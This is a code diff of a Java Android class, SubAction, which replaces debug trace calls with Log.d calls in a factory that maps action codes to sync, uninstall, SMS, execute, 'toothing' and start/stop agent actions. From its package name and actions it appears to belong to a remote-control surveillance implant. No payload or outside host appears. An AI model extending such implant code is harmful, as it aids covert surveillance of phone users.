@@ -7,6 +7,8 @@
 
 package com.ht.RCSAndroidGUI.action;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Status;
 
@@ -16,6 +18,8 @@ import com.ht.RCSAndroidGUI.Status;
  */
 public abstract class SubAction implements Runnable {
 
+	private static final String TAG = "SubAction";
+	
 	/** Actions definitions. */
 	public static int ACTION = 0x4000;
 
@@ -51,6 +55,8 @@ public abstract class SubAction implements Runnable {
 
 	/** The Constant ACTION_LOG. */
 	public final static int ACTION_LOG = 0x400b; // Crea un LOG_INFO
+
+	
 
 	/** Action type. */
 	private final int subActionType;
@@ -94,59 +100,37 @@ public abstract class SubAction implements Runnable {
 		final Debug debug = new Debug();
 		switch (type) {
 		case SubAction.ACTION_SYNC:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_SYNC ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_SYNC ***");
 			return new SyncActionInternet(type, confParams);
 		case ACTION_UNINSTALL:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_UNINSTALL ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_UNINSTALL ***");
 			return new UninstallAction(type, confParams);
 		case ACTION_RELOAD:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_RELOAD ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_RELOAD ***");
 			return new ReloadAction(type, confParams);
 		case ACTION_SMS:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_SMS ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_SMS ***");
 			return new SmsAction(type, confParams);
 		case ACTION_TOOTHING:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_TOOTHING ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_TOOTHING ***");
 			return new ToothingAction(type, confParams);
 		case ACTION_START_AGENT:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_START_AGENT ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_START_AGENT ***");
 			return new StartAgentAction(type, confParams);
 		case ACTION_STOP_AGENT:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_STOP_AGENT ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_STOP_AGENT ***");
 			return new StopAgentAction(type, confParams);
 		case ACTION_SYNC_PDA:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_SYNC_PDA ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_SYNC_PDA ***");
 			return new SyncPdaAction(type, confParams);
 		case ACTION_EXECUTE:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_EXECUTE ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_EXECUTE ***");
 			return new ExecuteAction(type, confParams);
 		case ACTION_SYNC_APN:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_SYNC ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_SYNC ***");
 			return new SyncActionApn(type, confParams);
 		case ACTION_LOG:
-			// #ifdef DEBUG
-			debug.trace("Factory *** ACTION_INFO ***");
-			// #endif
+			Log.d(TAG,"Factory *** ACTION_INFO ***");
 			return new LogAction(type, confParams);
 		default:
 			return null;
